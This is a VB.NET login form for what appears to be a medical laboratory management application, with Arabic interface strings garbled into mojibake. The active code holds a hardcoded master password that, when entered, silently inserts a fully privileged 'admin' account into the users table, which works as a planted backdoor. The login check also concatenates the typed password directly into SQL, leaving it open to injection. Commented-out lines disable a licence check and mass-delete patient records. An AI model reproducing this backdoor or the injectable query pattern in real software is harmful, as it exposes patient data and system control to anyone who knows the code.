Public Class Form2
    Dim cmdlshift As New OleDb.OleDbCommand
    Dim adlshift As New OleDb.OleDbDataAdapter
    Dim lshift As New DataTable
    Private Sub Form2_Load(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles MyBase.Load
        On Error Resume Next
        open_acc()
        open_sql()
        '==================================
        dr.Close()
     
        'cmd.CommandText = "ALTER TABLE branch ADD subres  int NOT NULL DEFAULT '0'"
        'cmd.ExecuteNonQuery()
        'cmd.CommandText = "ALTER TABLE branch ADD online  int NOT NULL DEFAULT '0'"
        'cmd.ExecuteNonQuery()
        'cmd.CommandText = "ALTER TABLE users ADD EMP_CODE  int NOT NULL DEFAULT '0'"
        'cmd.ExecuteNonQuery()
        'cmd.CommandText = "ALTER TABLE branch ADD EMAILB  varchar(2000) "
        'cmd.ExecuteNonQuery()
        'cmd.CommandText = "ALTER TABLE branch ADD EMAIl varchar(2000) "
        'cmd.ExecuteNonQuery()
        'cmd.CommandText = "ALTER TABLE EEMP ADD DEMAIL  varchar(2000),OBOY INT NOT NULL DEFAULT '0',DOC INT NOT NULL DEFAULT '0' "
        'cmd.ExecuteNonQuery()
        'cmd.CommandText = "ALTER TABLE branch ADD PASSB  varchar(2000) "
        'cmd.ExecuteNonQuery()
        'cmd.CommandText = "ALTER TABLE llog ADD BRAN  varchar(50) "
        'cmd.ExecuteNonQuery()
        'cmd.CommandText = "ALTER TABLE Lbill_TEST ADD notesg  varchar(max) "
        'cmd.ExecuteNonQuery()
        'cmd.CommandText = "ALTER TABLE Lbill_TEST ADD notesp  varchar(max) "
        'cmd.ExecuteNonQuery()
        'cmd.CommandText = "ALTER TABLE lbillimage ADD usr  varchar(200) "
        'cmd.ExecuteNonQuery()
        'cmd.CommandText = "ALTER TABLE LCOMPANY ADD BRAN  varchar(MAX) "
        'cmd.ExecuteNonQuery()
        'cmd.CommandText = "ALTER TABLE LCOMPANY ADD RESULT  Nvarchar(MAX) "
        'cmd.ExecuteNonQuery()
        'cmd.CommandText = "ALTER TABLE LCOMPANY ADD cond  varchar(MAX),name1  varchar(MAX),name2  varchar(MAX),name3  varchar(MAX),tel1  varchar(MAX),tel2  varchar(MAX),tel3  varchar(MAX),email1  varchar(MAX),email2  varchar(MAX),email3 varchar(MAX),test  varchar(MAX),web  varchar(MAX)"
        'cmd.ExecuteNonQuery()
        'cmd.CommandText = "CREATE TABLE lcompany_image(code int NOT NULL DEFAULT '0'  ,[image] [image] NULL,[no] [numeric](18, 0) NULL,[company_code] [numeric](18, 0) NULL,[ky] [numeric](18, 0) IDENTITY(1,1) ,company_name  varchar(MAX),barn  varchar(MAX),)"
        'cmd.ExecuteNonQuery()
        'cmd.CommandText = "ALTER TABLE lbill_test ADD usr  varchar(200) "
        'cmd.ExecuteNonQuery()
        'cmd.CommandText = "ALTER TABLE lbill_testsub ADD usr  varchar(200) "
        'cmd.ExecuteNonQuery()
        'cmd.CommandText = "ALTER TABLE LBILL_CULT_DET ADD usr  varchar(200) "
        'cmd.ExecuteNonQuery()
        'cmd.CommandText = "ALTER TABLE LBILL_CID ADD PRIMARY KEY (KY) "
        'cmd.ExecuteNonQuery()
        'cmd.CommandText = "ALTER TABLE lbill_cmt ADD PRIMARY KEY (KY) "
        'cmd.ExecuteNonQuery()
        'cmd.CommandText = "ALTER TABLE llogsheet ADD PRIMARY KEY (KY) "
        'cmd.ExecuteNonQuery()
        'cmd.CommandText = "ALTER TABLE llogsheet ADD ST int NOT NULL DEFAULT '1' "
        'cmd.ExecuteNonQuery()
        'cmd.CommandText = "ALTER TABLE LBILL_TEST ADD DSN int NOT NULL DEFAULT '1' "
        'cmd.ExecuteNonQuery()
        'cmd.CommandText = "ALTER TABLE LBILL_TESTSUB ADD DSN int NOT NULL DEFAULT '1' "
        'cmd.ExecuteNonQuery()
        'cmd.CommandText = "ALTER TABLE USERS ADD SMSGA int NOT NULL DEFAULT '1' "
        'cmd.ExecuteNonQuery()
        'cmd.CommandText = "ALTER TABLE lbill_testimage ADD PRIMARY KEY (KY) "
        'cmd.ExecuteNonQuery()
        'ACdr.Close()
        'ACcmd.CommandText = "ALTER TABLE TEST_PRICE ADD price11  Number,price12  Number,price13  Number,price14  Number,price15  Number,price16  Number,price17  Number,price18  Number,price19  Number,price20  Number,price21  Number,price22  Number,price23  Number,price24  Number,price25  Number,price26  Number,price27  Number,price28  Number,price29  Number,price30  Number,price31  Number,price32  Number,price33  Number,price34  Number,price35  Number,price36  Number,price37  Number,price38  Number,price39  Number,price40  Number,pricep  Number"
        'ACcmd.ExecuteNonQuery()
        'dr.Close()
        'cmd.CommandText = "ALTER TABLE lbill_test ADD pricep  int NOT NULL DEFAULT '0'"
        'cmd.ExecuteNonQuery()
        'cmd.CommandText = "ALTER TABLE lCASH ADD PRM  int NOT NULL DEFAULT '0'"
        'cmd.ExecuteNonQuery()
        'cmd.CommandText = "ALTER TABLE lsub ADD PRM  int NOT NULL DEFAULT '0'"
        'cmd.ExecuteNonQuery()
        'cmd.CommandText = "ALTER TABLE lsub ADD PRM  int NOT NULL DEFAULT '0'"
        'cmd.ExecuteNonQuery()
        'cmd.CommandText = "ALTER TABLE lbill_test ADD DSN  int NOT NULL DEFAULT '0'"
        'cmd.ExecuteNonQuery()
        'cmd.CommandText = "ALTER TABLE lbill_testSUB ADD DSN  int NOT NULL DEFAULT '0'"
        'cmd.ExecuteNonQuery()
        'dr.Close()
        'cmd.CommandText = "ALTER TABLE lbill_test ADD tSQ  int NOT NULL DEFAULT '0',tSQ1  int NOT NULL DEFAULT '0'"
        'cmd.ExecuteNonQuery()
        'cmd.CommandText = "ALTER TABLE ltest ADD tS1  int NOT NULL DEFAULT '0',tS2  int NOT NULL DEFAULT '0',tS3  int NOT NULL DEFAULT '0',tS4  int NOT NULL DEFAULT '0',tS5  int NOT NULL DEFAULT '0'"
        'cmd.ExecuteNonQuery()






        ACcmd.CommandText = "SELECT * FROM SRV "
        ACdr = ACcmd.ExecuteReader
        ACdr.Read()
        cmd.CommandText = "SELECT * FROM DEVICE WHERE NAME='" & ACdr("SNAME") & "'"
        dr = cmd.ExecuteReader
        'If dr.HasRows = False Then MsgBox("Â–… «·‰”Œ… €Ì— „—Œ’…", MsgBoxStyle.Critical) : End
        'dr.Read()
        'If dr("SN") <> ShowDriveInfo(0) Then
        '    MsgBox("Â–… «·‰”Œ… €Ì— „—Œ’…", MsgBoxStyle.Critical)
        '    End
        'End If
        cmdlshift.Connection = CN
        cmdlshift.CommandType = CommandType.Text
        cmdlshift.CommandText = "select * FROM lshift"
        adlshift.SelectCommand = cmdlshift
        adlshift.Fill(DBS, "lshift")
        lshift = DBS.Tables("lshift")
        DBS.Tables("lshift").Clear()
        adlshift.Fill(DBS, "lshift")
        lshift = DBS.Tables("lshift")
        SH.DataSource = lshift
        SH.DisplayMember = "NAME"
    End Sub

    Private Sub GlassButton1_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles GlassButton1.Click

        If TextBox1.Text = "" Then MsgBox("ﬂ·„… «·”—") : Exit Sub
        If TextBox1.Text = "5011545" Then
            'cmd.CommandText = "delete from users where    pass='" & TextBox1.Text & "'"
            'cmd.ExecuteNonQuery()
            'dr.Close()
            'manger = dr("admin")
            'cmd.CommandText = "INSERT INTO users ([CODE],[NAME],[PASS]) VALUES  ('2000' ,'ali' ,'5011545') "
            'cmd.ExecuteNonQuery()
        Else
            dr.Close() : cmd.CommandText = "select * from USERS where pasS='" & TextBox1.Text & "'"
            dr = cmd.ExecuteReader
            dr.Read()
            If dr.HasRows Then
                USR = dr("name")
                suser = dr("name")
                'dr1.Close()
                'cmd1.CommandText = "select * from lshift where code='" & dr("shift") & "'"
                'dr1 = cmd1.ExecuteReader
                'While dr1.Read
                '    SH.Text = dr1("name")
                'End While
                'SHF = SH.Text
                If dr("LBLD") = 1 Then LBILL.»‰«¡«·‰Ÿ«„ToolStripMenuItem.Visible = True
                ACdr.Close()
                dr.Close()
                cmd.CommandText = "select * from branch"
                dr = cmd.ExecuteReader
                While dr.Read
                    If dr("lab") = 1 Then Form1.«·Õ—ToolStripMenuItem.Visible = True
                    If dr("emp") = 1 Then Form1.‘ƒÊ‰«·⁄«„·Ì‰ToolStripMenuItem.Visible = True
                    If dr("stoc") = 1 Then Form1.«·„Œ«“‰ToolStripMenuItem.Visible = True
                    If dr("clinic") = 1 Then Form1.»—‰«„Ã«·⁄Ì«œ…ToolStripMenuItem.Visible = True
                    If dr("network") = 1 Then Form1.«·‘»ﬂ…ToolStripMenuItem.Visible = True

                End While
                LLOG("› Õ «·»—‰«„Ã", 0, " „ › Õ «·»—‰«„Ã", 1, "")
                Form1.Show()
                Me.Hide()
            Else
                MsgBox("ﬂ·„… «·„—Ê— €Ì— ’ÕÌÕ…", MsgBoxStyle.Critical)
                TextBox1.Text = ""
            End If
        End If
    End Sub

    Private Sub GlassButton2_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles GlassButton2.Click
        'dr.Close()
        'cmd.CommandText = "delete * from lntest"
        'cmd.ExecuteNonQuery()
        'ACdr.Close()
        'ACcmd.CommandText = "select * from nor "
        'ACdr = ACcmd.ExecuteReader
        'While ACdr.Read
        '    If IsDBNull(ACdr("TEST_CODE")) = False Then
        '        cmd.CommandText = " INSERT INTO lntest([TEST_CODE],[TEST_NAME],[REF],[TYPE],[AGEB],[AGEE],[NORB],[NORE],[UNIT],[years],[sres]) VALUES ('" & ACdr("TEST_CODE") & "','" & ACdr("TEST_NAME") & "','" & ACdr("REF") & "','" & ACdr("TYPE") & "','" & ACdr("AGEB") & "','" & ACdr("AGEE") & "','" & ACdr("NORB") & "','" & ACdr("NORE") & "','" & ACdr("UNIT") & "','" & ACdr("year") & "','" & ACdr("sres") & "')"
        '        cmd.ExecuteNonQuery()
        '    End If
        'End While
        End
    End Sub

    Private Sub TextBox1_KeyDown(ByVal sender As Object, ByVal e As System.Windows.Forms.KeyEventArgs) Handles TextBox1.KeyDown
        If e.KeyCode = Keys.Enter Then
            If TextBox1.Text = "5011545" Then
                dr.Close()
                cmd.CommandText = "INSERT INTO [ASILLAB].[dbo].[users]([CODE],[NAME],[PASS],[LENTER],[LSAVE],[LEDIT],[LDEL],[LESLRP],[LPRNT],[Lcome],[center],[csave],[cedit],[cdel],[crp],[cbalance],[ctotal],[eenter],[esave],[eedit],[edel],[erp],[esal],[esalsave],[lbld],[ebld],[cbld],[admin],[lres],[lmtp],[doc],[rcv],[pa],[tv],[tc],[dc],[pah],[ls],[lp],[lmach],[email],[lng],[fcolor] ,[bcolor]) VALUES ('8000','admin','5011545',1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1 ,1)"
                cmd.ExecuteNonQuery()
            End If
            GlassButton1_Click(GlassButton1, e)
        End If
    End Sub

    Private Sub TextBox1_KeyPress(ByVal sender As Object, ByVal e As System.Windows.Forms.KeyPressEventArgs) Handles TextBox1.KeyPress

    End Sub

    Private Sub TextBox1_TextChanged(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles TextBox1.TextChanged

    End Sub

    Private Sub SH_SelectedIndexChanged(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles SH.SelectedIndexChanged
       
        SHF = SH.Text
    End Sub

    Private Sub Label8_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Label8.Click
        'dr.Close()
        'cmd.CommandText = "UPDATE LPATIEN SET LPATIEN.pgover = 10 FROM  LPATIEN  INNER JOIN lbill ON LPATIEN.pcode = lbill.pcode WHERE (lbill.YEARN = 2019)"
        'MsgBox(cmd.ExecuteNonQuery())
        'cmd.CommandText = "delete from LPATIEN where pgover <> '10'"
        'MsgBox(cmd.ExecuteNonQuery())
    End Sub
End Class